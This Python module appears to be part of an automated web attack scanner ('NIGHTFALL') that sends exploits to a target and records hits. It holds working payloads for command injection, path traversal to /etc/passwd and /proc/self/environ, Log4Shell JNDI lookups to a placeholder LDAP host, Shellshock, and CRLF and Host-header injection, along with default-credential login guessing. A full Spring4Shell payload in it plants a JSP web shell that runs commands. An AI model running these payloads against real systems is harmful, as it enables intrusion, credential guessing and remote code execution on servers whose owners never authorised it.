"""
Falcon MAG - NIGHTFALL Advanced Server-Side Attack Engines
10 new engines for server-side vulnerabilities:
1. Command Injection (OS + Blind)
2. Path Traversal / LFI / RFI
3. Log4Shell + Spring4Shell
4. CRLF Injection
5. HTTP Host Header Injection
6. Default Credentials
7. Backup Files Discovery
8. Server Status Pages
9. PHP Info / Directory Listing
10. Shellshock
"""
from __future__ import annotations

import asyncio
import re
import time
from urllib.parse import urlparse, urljoin, quote


# ============================================================
# 1. Command Injection (OS + Blind)
# ============================================================

CMDI_PAYLOADS = {
    "linux": [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; uname -a",
        "| whoami",
        "&& id",
        "|| id",
        "; sleep 5",
        "| sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ],
    "windows": [
        "& whoami",
        "| whoami",
        "& ver",
        "| ipconfig",
        "; timeout 5",
        "& ping -n 6 127.0.0.1",
        "| ping -n 6 127.0.0.1",
    ],
}

CMDI_INDICATORS = [
    "uid=", "gid=", "groups=",           # id output
    "root:", "www-data:",                 # passwd-like
    "Linux", "Darwin", "Windows",         # uname output
    "Microsoft Windows", "Volume Serial", # Windows
    "administrator", "nt authority",      # Windows user
    "PING", "TTL=",                       # ping output
]


async def test_command_injection(pool, endpoint: str, params: list):
    """Test for OS command injection (direct + time-based)."""
    findings = []
    if not params:
        return findings

    # Baseline for time-based
    baseline_resp = await pool.send("GET", endpoint)
    baseline_time = baseline_resp.elapsed_ms / 1000.0

    for param in params[:5]:
        for os_type, payloads in CMDI_PAYLOADS.items():
            for payload in payloads[:6]:
                sep = "&" if "?" in endpoint else "?"
                test_url = f"{endpoint}{sep}{param}={quote(payload)}"

                start = time.monotonic()
                resp = await pool.send("GET", test_url)
                elapsed = time.monotonic() - start

                if resp.status == 0:
                    continue

                # Direct detection (output indicators)
                for indicator in CMDI_INDICATORS:
                    if indicator in resp.text:
                        findings.append({
                            "vuln_class": "command_injection",
                            "subtype": f"direct_{os_type}",
                            "severity": "critical",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Output indicator '{indicator}' found. Response: {resp.text[:300]}",
                            "confidence": "high",
                        })
                        break

                # Time-based detection (blind)
                if "sleep 5" in payload or "timeout 5" in payload or "ping -n 6" in payload:
                    if elapsed > 4.5 and elapsed > baseline_time + 4.0:
                        findings.append({
                            "vuln_class": "command_injection",
                            "subtype": f"blind_time_{os_type}",
                            "severity": "critical",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Time delay {elapsed:.2f}s (baseline {baseline_time:.2f}s)",
                            "confidence": "high",
                        })
                        break

    return findings


# ============================================================
# 2. Path Traversal / LFI / RFI
# ============================================================

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "/proc/self/environ",
    "/proc/self/cmdline",
]

TRAVERSAL_INDICATORS = [
    "root:x:", "root:!:",
    "[extensions]", "[fonts]",       # win.ini
    "daemon:", "bin:", "sys:",       # /etc/passwd
    "PATH=", "HOME=",                 # environ
    "for 16-bit app support",
]


async def test_path_traversal(pool, endpoint: str, params: list):
    """Test for path traversal / LFI / RFI."""
    findings = []
    if not params:
        return findings

    for param in params[:5]:
        for payload in TRAVERSAL_PAYLOADS:
            sep = "&" if "?" in endpoint else "?"
            test_url = f"{endpoint}{sep}{param}={quote(payload)}"
            resp = await pool.send("GET", test_url)

            if resp.status == 0:
                continue

            for indicator in TRAVERSAL_INDICATORS:
                if indicator in resp.text:
                    findings.append({
                        "vuln_class": "path_traversal",
                        "subtype": "lfi",
                        "severity": "critical",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "evidence": f"Indicator '{indicator}' found. Response: {resp.text[:300]}",
                        "confidence": "high",
                    })
                    break

    return findings


# ============================================================
# 3. Log4Shell + Spring4Shell
# ============================================================

LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://oast.local:1389/a}",
    "${jndi:ldaps://oast.local:1389/a}",
    "${jndi:dns://oast.local/a}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://oast.local:1389/a}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://oast.local:1389/a}",
]

SPRING4SHELL_PAYLOADS = [
    "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
]


async def test_log4shell(pool, target: str, oast=None):
    """Test for Log4Shell and Spring4Shell vulnerabilities."""
    findings = []
    if not target:
        return findings

    # Get OAST URL
    oast_url = oast.get_payload_url() if oast else None

    # Test Log4Shell via common headers
    headers_to_test = [
        "User-Agent", "X-Api-Version", "X-Forwarded-For",
        "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
        "X-Originating-IP", "Referer", "Accept-Language",
    ]

    for header in headers_to_test:
        for payload in LOG4SHELL_PAYLOADS[:2]:
            # Replace oast.local with actual OAST URL if available
            test_payload = payload
            if oast_url:
                test_payload = re.sub(r"(ldap|ldaps|dns)://oast\.local:\d+/\w+",
                                       oast_url.replace("http://", "ldap://").replace(":9999", ":1389"),
                                       payload)

            try:
                resp = await pool.send("GET", target, headers={header: test_payload})
                if resp.status > 0:
                    # If OAST exists, wait and check for callbacks
                    if oast and "jndi:dns" in test_payload:
                        for _i in range(4):
                            await asyncio.sleep(0.5)
                            if oast.callbacks:
                                findings.append({
                                    "vuln_class": "log4shell",
                                    "subtype": "jndi_injection",
                                    "severity": "critical",
                                    "url": target,
                                    "param": header,
                                    "payload": test_payload,
                                    "evidence": f"OAST callback received via {header}",
                                    "confidence": "high",
                                })
                                break
            except Exception:
                continue

    # Test Spring4Shell via POST with form
    for payload in SPRING4SHELL_PAYLOADS[:1]:
        try:
            sep = "&" if "?" in target else "?"
            test_url = f"{target}{sep}{payload}"
            resp = await pool.send("GET", test_url)
            if resp.status == 200:
                # Check for JSP creation indicator (hard to detect without OAST)
                if "tomcatwar" in resp.text.lower():
                    findings.append({
                        "vuln_class": "spring4shell",
                        "subtype": "rce_via_classloader",
                        "severity": "critical",
                        "url": test_url,
                        "param": "class.module.classLoader",
                        "payload": payload[:200],
                        "evidence": "Possible Spring4Shell indicator",
                        "confidence": "low",
                    })
        except Exception:
            continue

    return findings


# ============================================================
# 4. CRLF Injection
# ============================================================

CRLF_PAYLOADS = [
    "%0d%0aX-Injected: NIGHTFALL",
    "%0aX-Injected: NIGHTFALL",
    "%0d%0a%0d%0a<html>Injected</html>",
    "\r\nX-Injected: NIGHTFALL",
    "\nX-Injected: NIGHTFALL",
    "%E5%98%8A%E5%98%8DSet-Cookie: NIGHTFALL=1",
]


async def test_crlf_injection(pool, endpoint: str, params: list):
    """Test for CRLF injection / HTTP response splitting."""
    findings = []
    if not params:
        return findings

    for param in params[:5]:
        for payload in CRLF_PAYLOADS:
            sep = "&" if "?" in endpoint else "?"
            test_url = f"{endpoint}{sep}{param}={payload}"
            resp = await pool.send("GET", test_url)

            if resp.status == 0:
                continue

            # Check if injected header appears
            headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            if "x-injected" in headers_lower:
                findings.append({
                    "vuln_class": "crlf_injection",
                    "subtype": "header_injection",
                    "severity": "high",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": f"Injected header found: x-injected={headers_lower.get('x-injected')}",
                    "confidence": "high",
                })
                break

            # Check if body contains injected HTML
            if "Injected</html>" in resp.text or "X-Injected: NIGHTFALL" in resp.text:
                findings.append({
                    "vuln_class": "crlf_injection",
                    "subtype": "response_splitting",
                    "severity": "high",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "evidence": "CRLF injection confirmed in response body",
                    "confidence": "medium",
                })
                break

    return findings


# ============================================================
# 5. HTTP Host Header Injection
# ============================================================

async def test_host_header_injection(pool, target: str):
    """Test for HTTP Host header injection."""
    findings = []
    if not target:
        return findings

    parsed = urlparse(target)
    original_host = parsed.netloc

    injection_hosts = [
        "evil.com",
        f"evil.com:{parsed.port or 80}",
        f"evil.com#{original_host}",
        f"evil.com@{original_host}",
    ]

    for host in injection_hosts:
        try:
            resp = await pool.send("GET", target, headers={"Host": host})
            if resp.status == 0:
                continue

            # Check if injected host appears in response
            if "evil.com" in resp.text:
                findings.append({
                    "vuln_class": "host_header_injection",
                    "subtype": "reflected_in_body",
                    "severity": "medium",
                    "url": target,
                    "param": "Host",
                    "payload": host,
                    "evidence": "Injected host reflected in response body",
                    "confidence": "medium",
                })
                break

            # Check if location header contains evil.com
            location = resp.headers.get("location", "")
            if "evil.com" in location:
                findings.append({
                    "vuln_class": "host_header_injection",
                    "subtype": "password_reset_poisoning",
                    "severity": "high",
                    "url": target,
                    "param": "Host",
                    "payload": host,
                    "evidence": f"Redirect to {location}",
                    "confidence": "high",
                })
                break
        except Exception:
            continue

    return findings


# ============================================================
# 6. Default Credentials
# ============================================================

DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "password"),
    ("root", "toor"),
    ("user", "user"),
    ("test", "test"),
    ("guest", "guest"),
    ("administrator", "administrator"),
    ("admin", "Admin@123"),
]

LOGIN_PATHS = [
    "/admin/login", "/login", "/admin", "/administrator",
    "/wp-admin", "/wp-login.php", "/user/login",
    "/api/auth/login", "/api/login", "/auth/login",
]


async def test_default_credentials(pool, target: str, forms: list = None):
    """Test for default credentials on common login endpoints."""
    findings = []
    if not target:
        return findings

    parsed = urlparse(target)
    root = f"{parsed.scheme}://{parsed.netloc}"

    # Try common login paths
    for path in LOGIN_PATHS[:5]:
        login_url = root + path
        # Try GET to see if it exists
        try:
            resp = await pool.send("GET", login_url)
            if resp.status not in (200, 401, 403):
                continue
        except Exception:
            continue

        # Try POST with credentials
        for username, password in DEFAULT_CREDS[:5]:
            try:
                # Try JSON first
                json_body = f'{{"username":"{username}","password":"{password}"}}'
                resp = await pool.send(
                    "POST", login_url,
                    content=json_body,
                    headers={"Content-Type": "application/json"}
                )
                if resp.status == 200 and (
                    "token" in resp.text.lower()
                    or "session" in resp.text.lower()
                    or "welcome" in resp.text.lower()
                ):
                    findings.append({
                        "vuln_class": "default_credentials",
                        "subtype": "json_login",
                        "severity": "critical",
                        "url": login_url,
                        "param": "username/password",
                        "payload": f"{username}:{password}",
                        "evidence": f"Successful login response: {resp.text[:200]}",
                        "confidence": "medium",
                    })
                    break

                # Try form-encoded
                form_body = f"username={quote(username)}&password={quote(password)}"
                resp = await pool.send(
                    "POST", login_url,
                    content=form_body,
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                )
                if resp.status in (200, 302) and (
                    "location" in {k.lower() for k in resp.headers.keys()}
                    or "dashboard" in resp.text.lower()
                ):
                    findings.append({
                        "vuln_class": "default_credentials",
                        "subtype": "form_login",
                        "severity": "critical",
                        "url": login_url,
                        "param": "username/password",
                        "payload": f"{username}:{password}",
                        "evidence": "Login appeared successful",
                        "confidence": "low",
                    })
                    break
            except Exception:
                continue

    return findings


# ============================================================
# 7. Backup Files Discovery
# ============================================================

BACKUP_FILES = [
    # Common config backups
    "config.php.bak", "config.php~", "config.php.old", "config.php.save",
    "config.py.bak", "config.json.bak", "config.yml.bak",
    "wp-config.php.bak", "wp-config.php~",
    ".htaccess.bak", "web.config.bak",
    # Archive backups
    "backup.zip", "backup.tar.gz", "backup.rar", "backup.7z",
    "site.zip", "site.tar.gz", "www.zip", "www.tar.gz",
    "public_html.zip", "html.zip",
    # Editor swap files
    "index.php.swp", "index.php.swo", ".index.php.swp",
    ".config.php.swp", ".env.swp",
    # Source backups
    "index.php.bak", "index.php~", "index.html.bak",
    "app.js.bak", "app.py.bak",
    # Git/SVN
    ".git/config", ".git/HEAD", ".svn/entries", ".hg/store",
    # DB dumps (non-sql)
    "database.sql.bak", "db.sql.bak",
    # Dot files
    ".DS_Store", ".ftpconfig", ".remote-sync.json", ".idea/workspace.xml",
]


async def test_backup_files(pool, target: str):
    """Discover backup and temporary files."""
    findings = []
    if not target:
        return findings

    parsed = urlparse(target)
    root = f"{parsed.scheme}://{parsed.netloc}"

    for path in BACKUP_FILES:
        url = f"{root}/{path}"
        try:
            resp = await pool.send("GET", url)
            if resp.status == 200 and len(resp.text) > 10:
                # Determine severity based on type
                severity = "medium"
                if ".env" in path or ".git" in path or "wp-config" in path or "config" in path:
                    severity = "critical"
                elif path.endswith((".zip", ".tar.gz", ".rar")):
                    severity = "high"

                findings.append({
                    "vuln_class": "backup_file_exposure",
                    "subtype": path.split(".")[-1] if "." in path else "unknown",
                    "severity": severity,
                    "url": url,
                    "param": "",
                    "payload": path,
                    "evidence": f"File accessible ({len(resp.text)} bytes)",
                    "confidence": "high",
                })
        except Exception:
            continue

    return findings


# ============================================================
# 8. Server Status Pages
# ============================================================

STATUS_PATHS = [
    "/server-status",
    "/server-info",
    "/nginx_status",
    "/nginx-status",
    "/status",
    "/health",
    "/healthz",
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/mappings",
    "/actuator/beans",
    "/actuator/heapdump",
    "/actuator/threaddump",
    "/actuator/loggers",
    "/debug",
    "/debug/pprof/",
    "/metrics",
    "/stats",
    "/info",
    "/phpinfo.php",
    "/test.php",
    "/admin/status",
]

STATUS_INDICATORS = {
    "/server-status": ["apache server status", "server version", "current time"],
    "/server-info": ["apache server information", "module name"],
    "/nginx_status": ["active connections", "server accepts"],
    "/actuator": ["_links", "self", "health"],
    "/actuator/env": ["propertySources", "systemProperties"],
    "/actuator/heapdump": [],  # Binary file
    "/metrics": ["# HELP", "# TYPE"],
    "/debug/pprof/": ["Types of profiles available", "goroutine"],
    "/phpinfo.php": ["php version", "php credits", "configuration"],
}


async def test_server_status(pool, target: str):
    """Discover exposed server status/debug pages."""
    findings = []
    if not target:
        return findings

    parsed = urlparse(target)
    root = f"{parsed.scheme}://{parsed.netloc}"

    for path in STATUS_PATHS:
        url = root + path
        try:
            resp = await pool.send("GET", url)
            if resp.status != 200:
                continue

            # Check indicators
            indicators = STATUS_INDICATORS.get(path, [])
            body_lower = resp.text.lower()

            matched = False
            for ind in indicators:
                if ind.lower() in body_lower:
                    matched = True
                    break

            # Generic detection
            if not matched and any(x in body_lower for x in [
                "apache server status", "nginx", "actuator", "_links",
                "php version", "server info", "server-status", "heapdump",
            ]):
                matched = True

            if matched or (path == "/actuator/heapdump" and resp.status == 200 and len(resp.text) > 1000):
                severity = "medium"
                if "actuator" in path and path not in ("/actuator", "/actuator/health"):
                    severity = "high"
                if path == "/actuator/heapdump":
                    severity = "critical"

                findings.append({
                    "vuln_class": "server_status_exposure",
                    "subtype": path.strip("/").replace("/", "_"),
                    "severity": severity,
                    "url": url,
                    "param": "",
                    "payload": path,
                    "evidence": f"Status page accessible ({len(resp.text)} bytes)",
                    "confidence": "high",
                })
        except Exception:
            continue

    return findings


# ============================================================
# 9. PHP Info / Directory Listing
# ============================================================

PHPINFO_PATHS = [
    "/phpinfo.php", "/info.php", "/php.php", "/test.php", "/i.php",
    "/php_info.php", "/phpinfo", "/info", "/pi.php",
]

DIRECTORY_LISTING_INDICATORS = [
    "index of /", "parent directory", "[to parent directory]",
    "<title>index of", "directory listing for",
]


async def test_phpinfo_disclosure(pool, target: str):
    """Detect PHP info pages and directory listing."""
    findings = []
    if not target:
        return findings

    parsed = urlparse(target)
    root = f"{parsed.scheme}://{parsed.netloc}"

    # PHP info
    for path in PHPINFO_PATHS:
        url = root + path
        try:
            resp = await pool.send("GET", url)
            if resp.status == 200:
                body_lower = resp.text.lower()
                if "php version" in body_lower and "php credits" in body_lower:
                    findings.append({
                        "vuln_class": "phpinfo_disclosure",
                        "subtype": "phpinfo_page",
                        "severity": "medium",
                        "url": url,
                        "param": "",
                        "payload": path,
                        "evidence": f"PHP info page accessible ({len(resp.text)} bytes)",
                        "confidence": "high",
                    })
        except Exception:
            continue

    # Directory listing (check common dirs)
    dir_paths = ["/uploads/", "/files/", "/images/", "/assets/", "/static/", "/backup/", "/backups/", "/logs/", "/tmp/", "/temp/"]
    for path in dir_paths:
        url = root + path
        try:
            resp = await pool.send("GET", url)
            if resp.status == 200:
                body_lower = resp.text.lower()
                for ind in DIRECTORY_LISTING_INDICATORS:
                    if ind in body_lower:
                        findings.append({
                            "vuln_class": "directory_listing",
                            "subtype": path.strip("/"),
                            "severity": "medium",
                            "url": url,
                            "param": "",
                            "payload": path,
                            "evidence": f"Directory listing enabled",
                            "confidence": "high",
                        })
                        break
        except Exception:
            continue

    return findings


# ============================================================
# 10. Shellshock
# ============================================================

SHELLSHOCK_PAYLOADS = [
    "() { :;}; echo; /bin/echo SHELLSHOCK_VULNERABLE",
    "() { :;}; /bin/bash -c 'echo SHELLSHOCK_VULNERABLE'",
    "() { :;}; /bin/bash -c 'sleep 5'",
    "() { :;}; /usr/bin/id",
]

SHELLSHOCK_HEADERS = [
    "User-Agent",
    "Referer",
    "Cookie",
    "X-Forwarded-For",
]


async def test_shellshock(pool, target: str):
    """Test for Shellshock (CVE-2014-6271) vulnerability."""
    findings = []
    if not target:
        return findings

    for header in SHELLSHOCK_HEADERS:
        for payload in SHELLSHOCK_PAYLOADS:
            try:
                # Baseline
                baseline = await pool.send("GET", target)
                baseline_time = baseline.elapsed_ms / 1000.0

                start = time.monotonic()
                resp = await pool.send("GET", target, headers={header: payload})
                elapsed = time.monotonic() - start

                if resp.status == 0:
                    continue

                # Direct detection
                if "SHELLSHOCK_VULNERABLE" in resp.text:
                    findings.append({
                        "vuln_class": "shellshock",
                        "subtype": "cve_2014_6271",
                        "severity": "critical",
                        "url": target,
                        "param": header,
                        "payload": payload,
                        "evidence": f"SHELLSHOCK_VULNERABLE marker in response via {header}",
                        "confidence": "high",
                    })
                    break

                # Time-based detection
                if "sleep 5" in payload:
                    if elapsed > 4.5 and elapsed > baseline_time + 4.0:
                        findings.append({
                            "vuln_class": "shellshock",
                            "subtype": "blind_time",
                            "severity": "critical",
                            "url": target,
                            "param": header,
                            "payload": payload,
                            "evidence": f"Time delay {elapsed:.2f}s (baseline {baseline_time:.2f}s)",
                            "confidence": "high",
                        })
                        break

                # uid= output
                if "uid=" in resp.text and "gid=" in resp.text:
                    findings.append({
                        "vuln_class": "shellshock",
                        "subtype": "command_output",
                        "severity": "critical",
                        "url": target,
                        "param": header,
                        "payload": payload,
                        "evidence": f"Command output: {resp.text[:200]}",
                        "confidence": "high",
                    })
                    break
            except Exception:
                continue

    return findings


# ============================================================
# Main Orchestrator
# ============================================================

async def run_server_advanced_tests(pool, crawl_result: dict, oast=None) -> list:
    """Run all 10 server-side attack engines."""
    all_findings = []
    target = pool.config.target if hasattr(pool.config, "target") else ""
    base_url = target

    endpoints = crawl_result.get("endpoints", []) if crawl_result else []
    forms = crawl_result.get("forms", []) if crawl_result else []

    # Build endpoint-param mapping
    endpoint_params = {}
    for ep in endpoints[:20]:
        if "?" in ep:
            base, query = ep.split("?", 1)
            params = [p.split("=")[0] for p in query.split("&") if "=" in p]
            if params:
                endpoint_params[base] = params

    if not endpoint_params:
        common_params = ["id", "q", "s", "search", "page", "file", "url", "cmd", "path", "name"]
        for ep in endpoints[:5]:
            endpoint_params[ep] = common_params

    try:
        # 1. Command Injection
        for ep, params in list(endpoint_params.items())[:2]:
            findings = await test_command_injection(pool, ep, params)
            all_findings.extend(findings)

        # 2. Path Traversal / LFI
        for ep, params in list(endpoint_params.items())[:2]:
            findings = await test_path_traversal(pool, ep, params)
            all_findings.extend(findings)

        # 3. Log4Shell + Spring4Shell
        if base_url:
            findings = await test_log4shell(pool, base_url, oast)
            all_findings.extend(findings)

        # 4. CRLF Injection
        for ep, params in list(endpoint_params.items())[:2]:
            findings = await test_crlf_injection(pool, ep, params)
            all_findings.extend(findings)

        # 5. HTTP Host Header Injection
        if base_url:
            findings = await test_host_header_injection(pool, base_url)
            all_findings.extend(findings)

        # 6. Default Credentials
        if base_url:
            findings = await test_default_credentials(pool, base_url, forms)
            all_findings.extend(findings)

        # 7. Backup Files
        if base_url:
            findings = await test_backup_files(pool, base_url)
            all_findings.extend(findings)

        # 8. Server Status Pages
        if base_url:
            findings = await test_server_status(pool, base_url)
            all_findings.extend(findings)

        # 9. PHP Info / Directory Listing
        if base_url:
            findings = await test_phpinfo_disclosure(pool, base_url)
            all_findings.extend(findings)

        # 10. Shellshock
        if base_url:
            findings = await test_shellshock(pool, base_url)
            all_findings.extend(findings)

    except Exception as exc:
        try:
            from nightfall_core import log
            log.warning("server_advanced_tests_error", error=str(exc))
        except Exception:
            pass

    return all_findings